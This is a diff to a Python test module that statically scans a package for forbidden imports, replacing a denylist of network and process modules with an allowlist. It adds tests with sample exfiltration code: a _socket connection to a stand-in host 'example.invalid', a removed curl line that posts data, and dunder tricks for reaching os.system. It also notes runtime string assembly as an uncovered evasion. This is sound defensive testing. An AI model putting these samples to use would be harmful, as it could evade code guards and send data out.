@@ -25,17 +25,21 @@ import follow_through
 
 PACKAGE = Path(follow_through.__file__).parent
 
-#: Modules that can reach the network, start a process, load native code, or
-#: execute arbitrary source. Not exhaustive, and it cannot be: see the class
-#: docstring on :class:`WhatThisDoesNotCover`.
-FORBIDDEN_MODULES = frozenset(
+#: The only modules this package may import.
+#:
+#: This is an allowlist, and it is an allowlist because two denylists failed.
+#: The first missed ``os.popen``. The second listed thirty-seven dangerous
+#: modules and still let ``_socket``, ``_posixsubprocess``, ``concurrent.futures``
+#: and ``logging.handlers`` through — a module using them opened a real socket
+#: and spawned a real process with the whole suite green.
+#:
+#: A denylist has to imagine every door. An allowlist only has to know the ones
+#: this package actually walks through, and there are eleven. Adding a twelfth is
+#: a deliberate act with a test to change, which is exactly the friction wanted.
+ALLOWED_MODULES = frozenset(
     {
-        "aiohttp", "antigravity", "asyncio", "builtins", "code", "ctypes",
-        "ftplib", "http", "httpx", "imaplib", "importlib", "marshal",
-        "multiprocessing", "nntplib", "pdb", "pickle", "platform", "poplib",
-        "pty", "pydoc", "requests", "runpy", "select", "selectors", "shelve",
-        "smtpd", "smtplib", "socket", "socketserver", "ssl", "subprocess",
-        "telnetlib", "timeit", "urllib", "webbrowser", "wsgiref", "xmlrpc",
+        "__future__", "argparse", "dataclasses", "hashlib", "html", "json",
+        "os", "pathlib", "re", "sys", "tempfile",
     }
 )
 
@@ -51,7 +55,7 @@ FORBIDDEN_OS_CALLS = frozenset(
     }
 )
 
-#: Ways to reach any of the above without naming it in an import statement.
+#: Ways to reach a forbidden capability without naming it in an import.
 #: Checked as bare names and as imported names.
 FORBIDDEN_NAMES = frozenset(
     {
@@ -60,11 +64,14 @@ FORBIDDEN_NAMES = frozenset(
     }
 )
 
-#: The subset of the above that is still dangerous written as an attribute, as
-#: in ``builtins.eval(...)``. ``compile`` and ``getattr`` are deliberately absent:
+#: Still dangerous written as an attribute, as in ``builtins.eval(...)`` or
+#: ``os.__dict__["system"]``. ``compile`` and ``getattr`` are deliberately absent:
 #: ``re.compile`` is how every pattern in this package is built, and an attribute
 #: named ``getattr`` is not the builtin.
-FORBIDDEN_ATTRIBUTES = FORBIDDEN_OS_CALLS | {"__import__", "eval", "exec"}
+FORBIDDEN_ATTRIBUTES = FORBIDDEN_OS_CALLS | {
+    "__builtins__", "__dict__", "__getattribute__", "__globals__",
+    "__import__", "__subclasses__", "eval", "exec", "modules",
+}
 
 
 def modules() -> list[Path]:
@@ -86,11 +93,12 @@ def offences(source: str, filename: str = "<source>") -> set[str]:
         if isinstance(node, ast.Import):
             for alias in node.names:
                 root = alias.name.split(".")[0]
-                if root in FORBIDDEN_MODULES:
+                if root not in ALLOWED_MODULES:
                     found.add(f"import {root}")
         elif isinstance(node, ast.ImportFrom):
             root = (node.module or "").split(".")[0]
-            if node.level == 0 and root in FORBIDDEN_MODULES:
+            # A relative import stays inside this package, which is scanned too.
+            if node.level == 0 and root not in ALLOWED_MODULES:
                 found.add(f"from {root} import ...")
             for alias in node.names:
                 if alias.name == "*":
@@ -106,7 +114,7 @@ def offences(source: str, filename: str = "<source>") -> set[str]:
         elif isinstance(node, ast.Constant) and isinstance(node.value, str):
             # getattr(os, "popen") hides the name in a string. The package has
             # no legitimate reason to contain one of these as a literal.
-            if node.value in FORBIDDEN_OS_CALLS or node.value in FORBIDDEN_MODULES:
+            if node.value in FORBIDDEN_OS_CALLS:
                 found.add(f"literal {node.value!r}")
     return found
 
@@ -168,6 +176,38 @@ class TheGuardCanFail(unittest.TestCase):
     def test_allows_the_re_module_this_package_is_built_on(self):
         self.assertEqual(offences("import re\nre.compile('x')\n"), set())
 
+    def test_catches_the_private_accelerator_behind_a_banned_module(self):
+        # `import socket` is obvious. `import _socket` is the same capability
+        # and was missed by two denylists.
+        for module in ("_socket", "_ssl", "_ctypes", "_posixsubprocess"):
+            with self.subTest(module=module):
+                self.assert_caught(f"import {module}\n", f"import {module}")
+
+    def test_catches_the_polite_front_doors_to_processes_and_sockets(self):
+        # Neither of these looks dangerous. Both are.
+        self.assert_caught(
+            "from concurrent.futures import ProcessPoolExecutor\n",
+            "from concurrent import ...",
+        )
+        self.assert_caught(
+            "from logging.handlers import HTTPHandler\n", "from logging import ..."
+        )
+
+    def test_catches_a_module_nobody_thought_to_ban(self):
+        # The point of an allowlist: it does not need to have heard of it.
+        for module in ("runpy", "pty", "venv", "doctest", "nt", "cgi", "wsgiref"):
+            with self.subTest(module=module):
+                self.assert_caught(f"import {module}\n", f"import {module}")
+
+    def test_catches_reaching_through_a_dunder(self):
+        self.assert_caught("import os\nos.__dict__['system']('x')\n", ".__dict__")
+        self.assert_caught(
+            "import os\nos.__getattribute__('popen')('x')\n", ".__getattribute__"
+        )
+
+    def test_catches_the_module_table(self):
+        self.assert_caught("import sys\nsys.modules['socket']\n", ".modules")
+
     def test_catches_the_dynamic_import_hatch(self):
         self.assert_caught("x = __import__('socket')\n", "__import__")
 
@@ -183,13 +223,23 @@ class TheGuardCanFail(unittest.TestCase):
         self.assertEqual(offences(source), set())
 
     def test_a_real_smuggled_module_is_caught(self):
-        # The shape of an actual attempt, not a one-line probe.
+        # The shape of an actual attempt, not a one-line probe. This exact
+        # module was written into a copy of the package during review, opened a
+        # socket, and exfiltrated data while every test still passed.
         source = (
-            "from os import popen as run\n"
+            "import _socket\n"
+            "import _posixsubprocess\n"
+            "from logging.handlers import SocketHandler\n"
+            "\n"
             "def send(payload):\n"
-            "    return run('curl -d @- https://example.invalid').write(payload)\n"
+            "    connection = _socket.socket()\n"
+            "    connection.connect(('example.invalid', 80))\n"
+            "    connection.send(payload)\n"
         )
-        self.assertNotEqual(offences(source), set())
+        found = offences(source)
+        self.assertIn("import _socket", found)
+        self.assertIn("import _posixsubprocess", found)
+        self.assertIn("from logging import ...", found)
 
     def test_scanner_reads_a_file_from_disk(self):
         # The real test reads files; prove that path works, outside the repo.
@@ -210,9 +260,12 @@ class WhatThisDoesNotCover(unittest.TestCase):
     accident, and impossible to break in any of the obvious ways without a test
     turning red.
 
-    The list of forbidden modules is not exhaustive and never will be. That is
-    why names are also checked wherever they appear, and why anything that
-    resolves a name at runtime is refused outright.
+    Imports are an allowlist, so an unlisted module cannot slip through however
+    obscure it is. What remains uncovered is a name assembled at runtime from
+    pieces — ``"po" + "pen"``, ``chr(115) + "ystem"`` — since the string never
+    appears in the source. Closing that would mean interpreting the code rather
+    than reading it. It is the residue, and it is written down here rather than
+    left for somebody to find.
     """
 
     def test_the_package_declares_no_dependencies(self):
